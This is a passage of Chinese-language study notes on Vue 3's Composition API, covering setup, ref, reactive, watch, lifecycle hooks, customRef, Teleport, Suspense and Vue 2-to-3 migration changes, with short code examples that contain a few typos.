    - 若返回一个渲染函数：则可以自定义渲染内容。（了解）
5. 注意点：
    - 尽量不要与Vue2.x配置混用
        * Vue2.x配道(data、methos、computed.)中可以访问到setup中的属性、方法。
        * 但在setup中不能访问到Vue2.x配置(data、methos、computed.)。
        * 如果有重名，setup优先。
    - setup不能是一个asyncL函数，因为返回值不再是return的对象，而是promise,模板看不到return对象中的属性。

### ref()
1. 作用：定义一个响应式的数据
2. 语法：const xxx = ref(...)
3. ref()定义的数据是个对象，不可直接name='xxx'修改，而需要使用name.value；但是在模板中不需要name.value，可以直接name读取
4. ref()内部的数据可以是普通数据，也可以是一个对象，但是对象内部的属性或方法就需要job.value.salary
    - 基本类型的数据：响应式依然是靠Object.defineProperty()的get与set完成的。
    - 对象类型的数据：内部“求助”了Vue3.0中的一个新函数，reactive函数。

```vue
<script>
setup(){
	let name = ref('jim')
	let age = ref(18)
  function changeInfo(){
    name.value='james'
    age.value=20
  }
}
</script>

<template>
  <div>
  	{{name}},{{age}}
  </div>
</template>
```

```vue
<script>
  setup(){
  let job = ref({
    type:'teacher',
    salary:'2k'
  })
  function changeJob(){
    job.value.salary = '20k'
  }
}
</script>

<template>
  <div>
  	{{job.salary}}
  </div>
</template>
```

### reactive()
+ 作用：定议一个对象类型的响应式数据（基本类型不要用它，要用ref函数）
+ 语法：const 代理对象=reactive(源对象)，接收一个对象（或数组），返回一个代理对象(proxy对象)
+ reactive定义的响应式数据是“深层次的"
+ 内部基于ES6的Proxy实现，通过代理对象操作源对象内部数据进行操作

```vue
<script setup>
import { reactive } from 'vue'
let job = reactive({
    type: 'son',
    salary: '20k'
})
alert(job.salary)
</script>

<template>
    <div>{{ job.type }}</div>
</template>
```

如左图这样书写，可以将普通类型和对象类型写在一起，更加简便；同样的右图也可以

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1702018937584-1bf2b22c-703a-4ba4-9dff-f15a882de3a9.png)![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1702019035598-7ad4cfef-a132-4f86-830a-1847f208112e.png) 

### vue3中的响应式原理
#### vue2.x的响应式
实现原理：

+ 对象类型：通过Object.defineProperty()对属性的读取、修改进行拦截(数据劫持)
+ 数组类型：通过重写更新数组的一系列方法来实现拦截。（对数组的变更方法进行了包裹）

```vue
Object.defineProperty(data,'count',{
	get(){},
	set(){}
})
```

存在问题：

+ 新增新属性、删除旧属性时，界面不会更新
+ 直接通过下标修改数组，界面不会自动更新。

#### Vue3.0的响应式
使用reactive时，新增、删除属性时，页面会更新

实现原理：

+ 通过Proxy（代理）: 拦截对象中任意属性的变化, 包括：属性值的读写、属性的添加、属性的删除等。
+ 通过Reflect（反射）: 对源对象的属性进行操作。

```vue

/
const p = new Proxy(data, {
    // 拦截读取属性值
    get (target, prop) {
        return Reflect.get(target, prop)
    },
    // 拦截设置属性值或添加新属性
    set (target, prop, value) {
        return Reflect.set(target, prop, value)
    },
    // 拦截删除属性
    deleteProperty (target, prop) {
        return Reflect.deleteProperty(target, prop)
    }
})

proxy.name = 'tom'   
```

### reactive对比ref
+ 从定义数据角度对比：
    - ref用来定义：基本类型数据。
    - reactive用来定义：对象（或数组）类型数据。
    - 备注：ref也可以用来定义对象（或数组）类型数据，它内部会自动通过reactive转为代理对象。
+ 从原理角度对比：
    - ref通过Object.defineProperty()的get与set来实现响应式（数据劫持）。
    - reactive通过使用Proxy来实现响应式（数据劫持），并通过Reflect操作源对象内部的数据。
+ 从使用角度对比：
    - ref定义的数据：操作数据需要.value，读取数据时模板中直接读取不需要.value。
    - reactive定义的数据：操作数据与读取数据：均不需要.value。

### setup的两个注意点
setup执行的时机

+ 在beforeCreate之前执行一次，this是undefined。

setup的参数

+ props：值为对象，包含：组件外部传递过来，且组件内部声明接收了的属性。
+ context：上下文对象
    - attrs: 值为对象，包含：组件外部传递过来，但没有在props配置中声明的属性, 相当于 this.$attrs。
    - slots: 收到的插槽内容, 相当于 this.$slots。
    - emit: 分发自定义事件的函数, 相当于 this.$emit

### computed
与Vue2.x中computed配置功能一致 

```vue
import {computed} from 'vue'

setup(){
    ...
	//计算属性——简写
    let fullName = computed(()=>{
        return person.firstName + '-' + person.lastName
    })
    //计算属性——完整
    let fullName = computed({
        get(){
            return person.firstName + '-' + person.lastName
        },
        set(value){
            const nameArr = value.split('-')
            person.firstName = nameArr[0]
            person.lastName = nameArr[1]
        }
    })
}
```

### watch监视函数
+ 与Vue2.x中watch配置功能一致
+ 两个小“坑”：
    - 监视reactive定义的响应式数据时：oldValue无法正确获取、强制开启了深度监视（deep配置失效）。
    - 监视reactive定义的响应式数据中某个属性时：deep配置有效。

```vue

//情况一：监视ref定义的响应式数据
watch(sum,(newValue,oldValue)=>{
	console.log('sum变化了',newValue,oldValue)
},{immediate:true})

//情况二：监视多个ref定义的响应式数据
watch([sum,msg],(newValue,oldValue)=>{
	console.log('sum或msg变化了',newValue,oldValue)
}) 

//情况三：监视reactive定义的响应式数据
//若watch监视的是reactive定义的响应式数据，则无法正确获得oldValue！！
//若watch监视的是reactive定义的响应式数据，则强制开启了深度监视 
watch(person,(newValue,oldValue)=>{
	console.log('person变化了',newValue,oldValue)
},{immediate:true,deep:false})//此处的deep:false不再奏效

//情况四：监视reactive定义的响应式数据中的某个属性
watch(()=>person.job,(newValue,oldValue)=>{
	console.log('person的job变化了',newValue,oldValue)
},{immediate:true,deep:true}) 

//情况五：监视reactive定义的响应式数据中的某些属性
watch([()=>person.job,()=>person.name],(newValue,oldValue)=>{
	console.log('person的job变化了',newValue,oldValue)
},{immediate:true,deep:true})

//特殊情况
watch(()=>person.job,(newValue,oldValue)=>{
    console.log('person的job变化了',newValue,oldValue)
},{deep:true}) 
//此处由于监视的是reactive素定义的对象中的某个属性，所以deep配置有效
```

### watchEffect函数
watch的套路是：既要指明监视的属性，也要指明监视的回调。 

watchEffect的套路是：不用指明监视哪个属性，监视的回调中用到哪个属性，那就监视哪个属性。 

watchEffect有点像computed： 

+ 但computed注重的计算出来的值（回调函数的返回值），所以必须要写返回值。
+ 而watchEffect更注重的是过程（回调函数的函数体），所以不用写返回值。

```vue

//watchEffect所指定的回调中用到的数据只要发生变化，则直接重新执行回调。
watchEffect(()=>{
    const x1 = sum.value
    const x2 = person.age
    console.log('watchEffect配置的回调执行了')
})
```

## vue3生命周期
### 生命周期钩子
Vue3.0中可以继续使用Vue2.x中的生命周期钩子，但有有两个被更名： 

+ `beforeDestroy`改名为 `beforeUnmount`
+ `destroyed`改名为 `unmounted`

Vue3.0也提供了 Composition API 形式的生命周期钩子，与Vue2.x中钩子对应关系如下： 

+ `beforeCreate`===>`setup()`
+ `created`=======>`setup()`
+ `beforeMount` ===>`onBeforeMount`
+ `mounted`=======>`onMounted`
+ `beforeUpdate`===>`onBeforeUpdate`
+ `updated` =======>`onUpdated`
+ `beforeUnmount` ==>`onBeforeUnmount`
+ `unmounted` =====>`onUnmounted`

### 自定义hook函数
+ 什么是hook？—— 本质是一个函数，把setup函数中使用的Composition API进行了封装。 
+ 类似于vue2.x中的mixin。 
+ 自定义hook的优势: 复用代码, 让setup中的逻辑更清楚易懂。 
+ 创建一个文件夹hooks，在文件夹里定义名为ues.......js的文件，在其中可以实现某些功能

### toRef
+ 作用：创建一个 ref 对象，其value值指向另一个对象中的某个属性。 
+ 语法：`const name1 = toRef(person,'name')` 
+ 应用:   要将响应式对象中的某个属性单独提供给外部使用时。 
+ 扩展：`toRefs` 与`toRef`功能一致，但可以批量创建多个 ref 对象，语法：`toRefs(person)` 

```vue
<script>
	import {reactive,toRef}from 'vue'
	export default{
		name:'Demo',
		setup(){
			let person = reactive({
				name:'张三',a
				age:18,
				job:{
					j1:{
						salary:20
					}
        }
		const name1 = person.name//字符串
		const name2 = toRef(person,'name')//响应式
    console.log(name1,name2)
      
		return{
			name:toRef(person,'name'),
      salary:toRef(person.job.j1,'salary')
  	}
  }
</script>
```

## 其他composition API
### shallowRef--shallowReactive
+  shallowReactive：只处理对象最外层属性的响应式（浅响应式）
+  shallowRef：只处理基本数据类型的响应式, 不进行对象的响应式处理
+  什么时候使用? 
    - 如果有一个对象数据，结构比较深, 但变化时只是外层属性变化 ===> shallowReactive。
    - 如果有一个对象数据，后续功能不会修改该对象中的属性，而是生成新的对象来替换 ===> shallowRef。

```vue

//shallowReactive
<script>
import { shallowReactive } from 'vue'
export default {
    name: 'demo',
    setup() {
        let person = shallowReactive({
            name: '张三',
            age: 18,
            job: {
                j1: {
                    salary: 20
                }
            }
          })
      	return{
        	person
      	}
        //只能修改name,age,但是不能修改salary
    }
}
</script>

//shallowRef
<script>
import { shallowRef } from 'vue'
export default {
    name: 'demo',
    setup() {
        let x = shallowRef({
            y: 0
        })
        return {
            x,
        }
    }

}

</script>

<template>
    <div>当前y的值为:{{ x.y }}</div>
    <button @click="x.y++">点我y加1</button>
</template>
```

### readOnly--shallowReadOnly
+ readonly: 让一个响应式数据变为只读的（深只读）。
+ shallowReadonly：让一个响应式数据变为只读的（浅只读）。
+ 应用场景: 不希望数据被修改时。

```vue
<script>
import { readonly, shallowReadonly } from 'vue'
export default {
    name: 'demo',
    setup() {
        let x = readonly({
            y: 0  //只能读，不能修改
        })
        const a = shallowReadonly({
            b: 0, //只能读，不能修改
            c(){
              d{
                name:1,//可以修改
              }
            }
        })
        return {
            x,
            a
        }
    }

}
</script>
```

### toRaw--markRaw
toRaw： 

+ 作用：将一个由`reactive`生成的响应式对象转为普通对象。
+ 使用场景：用于读取响应式对象对应的普通对象，对这个普通对象的所有操作，不会引起页面更新。

markRaw： 

+ 作用：标记一个对象，使其永远不会再成为响应式对象。
+ 应用场景: 
    1. 有些值不应被设置为响应式的，例如复杂的第三方类库等。
    2. 当渲染具有不可变数据源的大列表时，跳过响应式转换可以提高性能。

```vue
<script>
import { toRaw, markRaw, reactive } from 'vue'
export default {
    name: 'demo',
    setup() {
        let x = reactive({
            y: 0
        })
        const z = toRaw(x)//只能处理reactive定义的响应式
        const m = markRaw(x)
        return {
            x,
            z,
            m
        }
    }

}
</script>
```

### customRef(自定义ref)
作用：创建一个自定义的 ref，并对其依赖项跟踪和更新触发进行显式控制。

customRef需要传递一个函数，函数参数是track和trigger，而且必须return一个对象，对象里包括get(读)和set(改)

实现防抖效果：

```vue
<template>
	<input type="text" v-model="keyword">
	<h3>{{keyword}}</h3>
</template>

<script>
	import {ref,customRef} from 'vue'
	export default {
		name:'Demo',
		setup(){
			//自定义一个myRef
			function myRef(value,delay){
				let timer
				//通过customRef去实现自定义
				return customRef((track,trigger)=>{
					return{
						get(){
							track() //告诉Vue这个value值是需要被“追踪”的
							return value
						},
						set(newValue){
							clearTimeout(timer)
							timer = setTimeout(()=>{
								value = newValue
								trigger() //告诉Vue去更新界面
							},delay)
						}
					}
				})
			}
			let keyword = myRef('hello',500) //使用程序员自定义的ref
			return {
				keyword
			}
		}
	}
</script>
```

### provide--inject
 作用：实现祖孙组件间通信 

 套路：父组件有一个 `provide` 选项来提供数据，后代组件有一个 `inject` 选项来开始使用这些数据 

 具体写法： 

```vue
setup(){
	......
    let car = reactive({name:'奔驰',price:'40万'})
    provide('car',car)
    ......
}
```

```vue
setup(props,context){
	......
    const car = inject('car')
    return {car}
	......
}
```

### 响应式数据的判断
+ isRef: 检查一个值是否为一个 ref 对象
+ isReactive: 检查一个对象是否是由 `reactive` 创建的响应式代理
+ isReadonly: 检查一个对象是否是由 `readonly` 创建的只读代理
+ isProxy: 检查一个对象是否是由 `reactive` 或者 `readonly` 方法创建的代理

#### Composition优势
使用传统OptionsAPI中，新增或者修改一个需求，就需要分别在data，methods，computed里修改 。

![](https://cdn.nlark.com/yuque/0/2023/gif/29327577/1703470802635-440bfc1e-c4a3-40a1-986a-5d813ce642a8.gif)

![](https://cdn.nlark.com/yuque/0/2023/gif/29327577/1703470827307-f7a8b4c6-500c-4907-ba72-0998695cf6ce.gif)

Composition API 可以更加优雅的组织我们的代码，函数。让相关功能的代码更加有序的组织在一起。(所以hook函数很重要)

![](https://cdn.nlark.com/yuque/0/2023/gif/29327577/1703470889507-bf188a4e-e865-4932-a5c1-26ec047773ab.gif)

![](https://cdn.nlark.com/yuque/0/2023/gif/29327577/1703470910514-99520a8e-1b7f-4328-b4ed-d5150af3834b.gif)

## 新组件
### Fragment
+ 在Vue2中: 组件必须有一个根标签
+ 在Vue3中: 组件可以没有根标签(<div id="app"></div>), 内部会将多个标签包含在一个Fragment虚拟元素中，且Fragment不参与渲染
+ 好处：减少标签层级, 减小内存占用

### Teleport
Teleport是一种能够将我们的组件html结构移动到指定位置的技术。

to可以写html代码，比如"body"

```vue
<teleport to="移动位置">
	<div v-if="isShow" class="mask">
		<div class="dialog">
			<h3>我是一个弹窗</h3>
			<button @click="isShow = false">关闭弹窗</button>
		</div>
	</div>
</teleport>
```

### suspense
等待异步组件时渲染一些额外内容，让应用有更好的用户体验

渲染好的先显示，而不是都渲染好了再显示

```vue
import { defineAsyncComponent } from 'vue'
const Child = defineAsyncComponent(()=>import('./components/Child.vue'))
//异步(动态)引入
<template>
	<div class="app">
		<h3>我是App组件</h3>
		<Suspense>
			<template v-slot:default>
				<Child/>
			</template>
			<template v-slot:fallback>
				<h3>加载中</h3>
			</template>
		</Suspense>
	</div>
</template>
```

## 其他
### 全局api的转移
Vue 2.x 有许多全局 API 和配置。例如：注册全局组件、注册全局指令等。

```vue

//注册全局组件
Vue.component('MyButton', {
  data: () => ({
    count: 0
  }),
  template: '<button @click="count++">Clicked {{ count }} times.</button>'
})

//注册全局指令
Vue.directive('focus', {
  inserted: el => el.focus()
}
```

Vue3.0中对这些API做出了调整：将全局的API，即：vue.xxx调整到应用实例（app）上

![](https://cdn.nlark.com/yuque/0/2023/png/29327577/1703471973447-cfa3a92f-5da8-466c-bff6-67597cb42af9.png)

### 其他改变
+  data选项应始终被声明为一个函数。data(){} 
+  过渡类名的更改： 

```vue

.v-enter,
.v-leave-to {
  opacity: 0;
}
.v-leave,
.v-enter-to {
  opacity: 1;
}
```

```vue

.v-enter-from,
.v-leave-to {
  opacity: 0;
}

.v-leave-from,
.v-enter-to {
  opacity: 1;
}
```

+ 移除keyCode作为v-on的修饰符，同时也不再支持config.keyCodes
+ 移除过滤器（filter）
+ 移除v-on.native修饰符

```vue

//
<my-component
  v-on:close="handleComponentEvent"
  v-on:click="handleNativeClickEvent"
/>
```

```vue
<script>
  export default {
    emits: ['close']
  }
</script>
```

